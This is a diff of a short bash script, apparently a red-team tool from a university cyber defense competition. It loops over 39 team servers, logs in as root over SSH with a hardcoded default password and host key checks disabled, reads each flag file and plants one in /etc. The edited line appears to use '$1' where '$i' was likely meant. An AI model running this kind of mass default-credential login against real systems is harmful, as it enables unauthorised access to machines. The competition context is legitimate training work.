@@ -1,6 +1,6 @@
 #!/bin/bash
 for i in {1..39}; do
-	 sshpass -p 'cdc' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@www.team$i.isucdc.com  echo SUCCESS ON TEAM $i \; cat /root/flag.txt \; echo `cat flags/team$i` > /etc/flag.flag &
+	 sshpass -p 'cdc' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@www.team$i.isucdc.com  echo SUCCESS ON TEAM $i \; cat /root/flag.txt \; echo `cat team$1/*www*` \> /etc/flag.flag &
 
 done
 
